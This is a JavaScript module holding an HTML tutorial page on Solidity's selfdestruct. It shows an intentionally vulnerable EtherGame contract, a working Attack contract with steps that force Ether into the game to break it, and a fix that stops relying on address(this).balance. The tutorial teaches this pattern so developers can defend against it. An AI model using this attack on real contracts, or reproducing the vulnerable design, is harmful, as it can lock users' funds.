// metadata
export const version = "0.5.16"
export const title = "Self Destruct"
export const description = "An example of how to delete your smart contract by calling seldestruct in Solidity"

const html = `<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>
<p><code>selfdestruct</code> sends all remainig Ether stored in the contract to an
designated address.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>A malicious contract can use <code>selfdestruct</code> to
force send Ether to any contract.</p>
<pre><code class="language-solidity">pragma solidity ^0.5.16;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance &lt;= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call.value(address(this).balance)("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) public {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance &gt;= 7 ether

        // cast address to payable
        address payable addr = address(uint160(address(etherGame)));
        selfdestruct(addr);
    }
}

</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>Don&#39;t rely on <code>address(this).balance</code></p>
<pre><code class="language-solidity">pragma solidity ^0.5.16;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance &lt;= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call.value(address(this).balance)("");
        require(sent, "Failed to send Ether");
    }
}</code></pre>
`

export default html
